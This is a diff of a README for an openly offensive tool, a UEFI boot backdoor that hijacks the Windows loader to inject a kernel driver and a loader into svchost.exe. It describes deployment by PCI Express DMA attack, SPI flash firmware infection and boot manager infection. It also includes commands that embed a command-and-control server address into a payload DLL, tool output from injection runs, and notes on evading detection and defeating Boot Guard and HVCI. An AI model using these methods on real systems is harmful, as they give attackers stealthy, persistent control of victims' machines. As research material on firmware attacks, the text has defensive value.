@@ -3,23 +3,23 @@
 
 [General information](#general-information)  
 [Contents](#contents)  
-[Deploying the backdoor using pre-boot DMA Attack](#deploying-the-backdoor-using-pre-boot-dma-attack)  
+[Deploying the backdoor using pre-boot DMA attack](#deploying-the-backdoor-using-pre-boot-dma-attack)  
 [Deploying the backdoor using firmware flash image infection](#deploying-the-backdoor-using-firmware-flash-image-infection)  
 [Deploying the backdoor using Windows boot manager infection](#deploying-the-backdoor-using-windows-boot-manager-infection)  
 [Using boot backdoor with DMA Shell payload](#using-boot-backdoor-with-dma-shell-payload)  
 [Using boot backdoor with Micro Backdoor payload](#using-boot-backdoor-with-micro-backdoor-payload)  
 [Using boot backdoor with Meterpreter payload](#using-boot-backdoor-with-meterpreter-payload)  
-[Building From the Source Code](#building-from-the-source-code)    
+[Building from the source code](#building-from-the-source-code)    
 
 ## General information
 
-This repository contains binaries and source code of Boot Backdoor &minus; UEFI DXE driver that intended for executing of kernel mode and user mode payloads under the Windows operating system by having an arbitrary code execution at early boot stage during DXE phase of the platform initialization. Backdoor is working by hijacking of Windows Loader `winload.efi` execution flow to inject [its driver](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/backdoor/driver/driver.cpp) into the loading Windows kernel and then, having kernel mode code execution, the driver injects [user mode loader](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/backdoor/loader/loader.cpp) into the legitimate `svchost.exe` process running under the local system. Unlike [LoJax](https://www.welivesecurity.com/2018/09/27/lojax-first-uefi-rootkit-found-wild-courtesy-sednit-group/) or [Hacking Team UEFI rootkit](https://attack.mitre.org/software/S0047/) this backdoor resides only in memory without dropping of any files on the disk and without creating of any processes, this fact makes its detection way more difficult.
+This repository contains binaries and source code of Boot Backdoor &minus; UEFI DXE driver intended for executing of kernel mode and user mode payloads under the Windows operating system by having an arbitrary code execution at early boot stage during DXE phase of the platform initialization. Backdoor is working by hijacking of Windows Loader `winload.efi` execution flow to inject [its driver](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/backdoor/driver/driver.cpp) into the loading Windows kernel and then, having kernel mode code execution, backdoor driver injects [user mode loader](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/payloads/DmaBackdoorBoot/backdoor/loader/loader.cpp) into the legitimate `svchost.exe` process running under the local system. Unlike [LoJax](https://www.welivesecurity.com/2018/09/27/lojax-first-uefi-rootkit-found-wild-courtesy-sednit-group/) or [Hacking Team UEFI rootkit](https://attack.mitre.org/software/S0047/) this backdoor resides only in memory without dropping of any files on the disk and without creating of any processes, this fact makes its detection way more difficult.
 
 The backdoor can be deployed in various of ways:
 
- * DMA attack over the PCI Express bus using [PCI Express DIY hacking toolkit](https://github.com/Cr4sh/s6_pcie_microblaze), also compatible with my other [Xilinx Zynq-7000 based design](https://github.com/Cr4sh/zc_pcie_dma) for DMA attacks. This method can be used with enabled UEFI Secure Boot.
+ * DMA attack over the PCI Express bus using [PCI Express DIY hacking toolkit](https://github.com/Cr4sh/s6_pcie_microblaze), also compatible with my other [Xilinx Zynq-7000 based design](https://github.com/Cr4sh/zc_pcie_dma) for DMA attacks. This method can be used with enabled UEFI Secure Boot and Intel Boot Guard.
 
- * UEFI bootkit based on the infection of the platform firmware stored in [SPI flash chip on the motherboard](https://raw.githubusercontent.com/Cr4sh/blog/master/uefi-boot-script-expl/spi-flash-chips.jpg), which is suitable for supply chain attacks. This method can be used with enabled UEFI Secure Boot as well.
+ * UEFI bootkit based on the infection of the platform firmware stored in [SPI flash chip on the motherboard](https://raw.githubusercontent.com/Cr4sh/blog/master/uefi-boot-script-expl/spi-flash-chips.jpg), which is suitable for supply chain attacks. This method can be used with enabled UEFI Secure Boot as well but only on machines without Intel Boot Guard.
 
  * Windows boot manager image file infection with emulation of enabled UEFI secure boot. This method requires initially disabled UEFI Secure Boot.
 
@@ -36,9 +36,9 @@ Here you can see some demo of Boot Backdoor + DMA Shell in action, [Xilinx ZC706
 
 Boot backdoor code base consists from the following files:
 
- * `src/BootBackdoor.c` &minus; UEFI DXE driver that hooks Windows Loader to hijack its boot flow and inject custom driver into the operating system kernel at early initialization stage. 
+ * `src/BootBackdoor.c` &minus; UEFI DXE driver that hijacks Windows Loader to inject custom backdoor driver into the operating system kernel at early initialization stage. 
 
- * `backdoor/driver/` &minus; Source code of backdoor driver for Windows that loads kernel mode payloads (when they are present) and injects user mode loader DLL image into the `svchost.exe` process. The driver binary in embedded into the backdoor main binary `BootBackdoor_X64.efi`.
+ * `backdoor/driver/` &minus; Source code of backdoor driver that loads kernel mode payloads (when they are present) and injects user mode loader DLL image into the `svchost.exe` process. The driver binary in embedded into the backdoor main binary `BootBackdoor_X64.efi`.
 
  * `backdoor/loader/` &minus; Source code of user mode loader DLL that executes user mode payloads (when they are present) in context of the `svchost.exe` process. User mode loader binary is embedded into the backdoor kernel driver binary.
 
@@ -175,11 +175,11 @@ driver.cpp(435) : DeviceUnregisterThread(): Device successfully deleted
 
 To infect platform firmware stored in the flash chip on the motherboard you will need some SPI flash programmer, I prefer to use cheap and widely available [FT2232H Mini Module](https://www.ftdichip.com/Support/Documents/DataSheets/Modules/DS_FT2232H_Mini_Module.pdf) from FTDI. Also, there's a [board called Tigrad](https://www.crowdsupply.com/securinghw/tigard) &minus; multi-protocol, multi-voltage tool for hardware hacking that cat work as SPI flash programmer. In addition to the programmer you also will need the following tools:
 
- * [UEFITool](https://github.com/LongSoft/UEFITool/releases/tag/0.28.0) utility to parse and edit UEFI flash images. 
+ * [UEFITool](https://github.com/LongSoft/UEFITool/releases/tag/0.28.0) utility to parse and edit UEFI flash images
 
- * [Flashrom](https://github.com/flashrom/flashrom/releases/tag/v1.2) utility to work with SPI flash programmer.
+ * [Flashrom](https://github.com/flashrom/flashrom/releases/tag/v1.2) utility to work with SPI flash programmer
 
- * SOIC8 [test clip](https://www.sparkfun.com/products/13153) or [probe hook](https://www.sparkfun.com/products/9741) clips kit to connect programmer to the flash chip without its desoldering.
+ * SOIC8 [test clip](https://www.sparkfun.com/products/13153) or [probe hook](https://www.sparkfun.com/products/9741) clips kit to connect programmer to the flash chip without its desoldering
 
 First of all, you have to disassemble the machine and locate SPI flash chip with platform firmware. Usually, it's [W25Q64](https://www.winbond.com/resource-files/w25q64fv%20revq%2006142016.pdf) or [W25Q128](https://www.winbond.com/resource-files/w25q128fv_revhh1_100913_website1.pdf) Windbond NOR flash in SOIC8 package. Then you have to connect the chip to the FT2232H Mini Module. It’s more convenient to use SOIC8 test clip than probe hook clips, but very often there’s not enough free space around the chip to place test clip. Flash chip must be connected to the channel A of FT2232 Mini Module by the following scheme:
 
@@ -404,28 +404,28 @@ $ ./server.py
 [01/May/2021:03:50:01] ENGINE Bus STARTED
 ```
 
-Now you need to write server configuration into the Micro Backdoor DLL image file using `payload_builder.py` program (where `192.168.2.7` is IP address of the host where server is running):
+Now you need to write server configuration into the Micro Backdoor DLL image file using `client_builder.py` program (where `192.168.2.7` is IP address of the host where server is running):
 
 ```
-./payload_builder.py payload_amd64_debug.dll 192.168.2.7
+./client_builder.py client_amd64_debug.dll 192.168.2.7
 Using server address 192.168.2.7:28115
 Using server certificate "/Users/d_olex/tc/_PoC/MicroBackdoor/server/server.crt"
-45568 bytes readed from "payload_amd64_debug.dll"
+45568 bytes readed from "client_amd64_debug.dll"
 ".conf" section at RVA 0xa800
-45568 bytes written into the "payload_amd64_debug.dll"
+45568 bytes written into the "client_amd64_debug.dll"
 ```
 
 Now you can use `uefi_backdoor_boot.py` program with Micro Backdoor payload in the same way as it was described in [Deploying the backdoor using pre-Boot DMA attack](#deploying-the-backdoor-using-pre-boot-dma-attack) section:
 
 ```
-$ ./uefi_backdoor_boot.py --payload payload_amd64_debug.dll
+$ ./uefi_backdoor_boot.py --payload client_amd64_debug.dll
 [+] 45568 bytes of payload image read
 [+] 27685 bytes of payload image after the compression
 [+] Using UEFI system table hook injection method
 [+] Waiting for PCI-E link...
 [!] PCI-E endpoint is not configured by root complex yet
-[!] mem_read() returned EFAULT
-[!] mem_read() returned EFAULT
+[!] Bad MRd TLP completion received
+[!] Bad MRd TLP completion received
 [+] PCI-E link with target is up
 [+] Device address is 01:00.0
 [+] Looking for DXE driver PE image...
@@ -560,6 +560,11 @@ nt authority\system
 ```
 
 **NOTE: Stock Meterpreter stager is easily detectable by most of AV/EDR products, when it's not working on your test system for some reason &minus; check the antivirus logs, maybe it was just killed.**
+
+
+## TODO
+
+* Support of [Virtualization-based Security]((https://docs.microsoft.com/en-us/windows-hardware/design/device-experiences/oem-vbs)) enabled targets with Hypervisor-Protected Code Integrity (HVCI).
 
 
 ## Building from the source code
